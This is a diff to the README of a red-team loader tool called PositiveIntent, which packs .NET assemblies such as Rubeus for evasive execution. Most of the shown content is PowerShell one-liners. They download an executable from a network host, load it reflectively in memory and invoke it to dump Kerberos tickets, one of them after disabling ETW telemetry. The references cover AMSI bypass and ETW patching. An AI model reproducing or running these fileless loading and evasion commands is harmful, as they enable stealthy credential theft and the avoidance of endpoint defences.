@@ -29,10 +29,13 @@ python build.py --file ~/Rubeus.exe --hostname TEST --domain www.slack.com --arg
 [+] Loader compiled to /home/kali/PositiveIntent/temp/nJbxZAGC.exe
 ```
 
-## Reflectively Loading PositiveIntent (One-Liner)
+## Reflectively Loading
 
 ```
-$si = New-Object System.Diagnostics.ProcessStartInfo -Property @{ FileName="powershell.exe"; Arguments="-Command `$bytes = (Invoke-WebRequest -Uri 'http://192.168.0.250/YJITjPVe.exe' -UseBasicParsing).Content; `$assembly = [System.Reflection.Assembly]::Load(`$bytes); `$entrypoint = `$assembly.EntryPoint; `$args = 'dump /nowrap'.Split(' '); `$entrypoint.Invoke(`$null, @(,`$args))"; RedirectStandardOutput=$true; RedirectStandardError=$true; UseShellExecute=$false; }; $si.Environment.Add("COMPlus_ETWEnabled", "0"); $process = [System.Diagnostics.Process]::Start($si); $stdout = $process.StandardOutput.ReadToEnd(); $stderr = $process.StandardError.ReadToEnd(); $process.WaitForExit(); $stdout; $stderr
+$bytes = (Invoke-WebRequest -Uri 'http://192.168.0.250/bvqBDNHE.exe' -UseBasicParsing).Content
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$entrypoint = $assembly.EntryPoint; [string[]]$arguments = 'dump /nowrap'.Split(' ')
+$entrypoint.Invoke($null, @(,$arguments))
 ```
 
 ## Features
@@ -51,11 +54,14 @@ $si = New-Object System.Diagnostics.ProcessStartInfo -Property @{ FileName="powe
 - Built with .NET Framework 4.5.1 and C# 7.3 for compatibility with various Windows versions.
 
 ## References
+[CrowdStrike Researchers Investigate the Threat of Patchless AMSI Bypass Attacks](https://www.crowdstrike.com/en-us/blog/crowdstrike-investigates-threat-of-patchless-amsi-bypass-attacks/)
 [Anatomy of a .NET Assembly – The DOS Stub](https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-the-dos-stub/)  
 [A Dive Into the PE File Format](https://0xrick.github.io/win-internals/pe3)  
 [Hiding your .NET - ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/)  
 [Red Team Tradecraft: Loading Encrypted C# Assemblies In Memory](https://www.mike-gualtieri.com/posts/red-team-tradecraft-loading-encrypted-c-sharp-assemblies-in-memory)  
-[Building, Modifying, and Packing with Azure DevOps](https://blog.xpnsec.com/building-modifying-packing-devops/)  
-[DeepSeek](https://deepseek.com/) (THE GOAT)  
+[Building, Modifying, and Packing with Azure DevOps](https://blog.xpnsec.com/building-modifying-packing-devops/)
+[Announcing the .NET Framework 4.8](https://devblogs.microsoft.com/dotnet/announcing-the-net-framework-4-8/)
+[Understanding ETW Patching](https://jonny-johnson.medium.com/understanding-etw-patching-9f5af87f9d7b)
+[DeepSeek](https://deepseek.com/) 
 [ChatGPT](https://chatgpt.com/)  
 [Claude](https://claude.ai/)
